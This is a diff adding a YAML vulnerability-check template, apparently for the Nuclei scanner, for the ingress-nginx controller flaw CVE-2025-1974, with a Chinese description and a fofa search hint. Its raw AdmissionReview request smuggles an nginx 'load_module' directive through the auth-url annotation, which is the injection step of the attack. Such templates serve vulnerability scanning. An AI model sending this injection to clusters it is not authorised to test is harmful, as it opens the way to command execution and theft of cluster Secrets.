@@ -1,0 +1,93 @@
+id: ingress-nginx-controller-rce
+
+info:
+  name: "Kubernetes Ingress-NGINX Controller 未授权远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: ingress-nginx
+    Kubernetes ingress-nginx是云原生计算基金会（Cloud Native Computing Foundation）维护的Kubernetes入口控制器，基于NGINX实现反向代理与负载均衡功能。该组件在特定网络条件下存在权限验证缺失缺陷，攻击者通过访问Pod网络层可绕过身份认证机制，在控制器环境中执行任意系统命令，最终导致集群敏感信息（如Secrets）被非法获取。
+  reference:
+  - CVE-2025-1974
+  tags: Kubernetes-NGINX-Controller
+
+http:
+- raw:
+  - |
+    POST / HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+
+    {
+      "kind": "AdmissionReview",
+      "apiVersion": "admission.k8s.io/v1",
+      "request": {
+        "uid": "d48aa397-c414-4fb2-a2b0-b28187daf8a6",
+        "kind": {
+          "group": "networking.k8s.io",
+          "version": "v1",
+          "kind": "Ingress"
+        },
+        "resource": {
+          "group": "networking.k8s.io",
+          "version": "v1",
+          "resource": "ingresses"
+        },
+        "requestKind": {
+          "group": "networking.k8s.io",
+          "version": "v1",
+          "kind": "Ingress"
+        },
+        "requestResource": {
+          "group": "networking.k8s.io",
+          "version": "v1",
+          "resource": "ingresses"
+        },
+        "name": "test-ee05c512-4ea7-418b-b4aa-9fc5a10874ee",
+        "namespace": "default",
+        "operation": "CREATE",
+        "userInfo": {
+        },
+        "object": {
+          "kind": "Ingress",
+          "apiVersion": "networking.k8s.io/v1",
+          "metadata": {
+            "name": "test-ee05c512-4ea7-418b-b4aa-9fc5a10874ee",
+            "namespace": "default",
+            "creationTimestamp": null,
+            "annotations": {
+    "nginx.ingress.kubernetes.io/auth-url": "http://example.com#;load_module test;\n"
+            }
+          },
+          "spec": {
+            "ingressClassName": "nginx",
+            "rules": [
+              {
+                "host": "ee05c512-4ea7-418b-b4aa-9fc5a10874ee",
+                "http": {
+                  "paths": [
+                  ]
+                }
+              }
+            ]
+          },
+          "status": {
+            "loadBalancer": {}
+          }
+        },
+        "oldObject": null,
+        "dryRun": true,
+        "options": {
+          "kind": "CreateOptions",
+          "apiVersion": "meta.k8s.io/v1"
+        }
+      }
+    }
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'AdmissionReview'
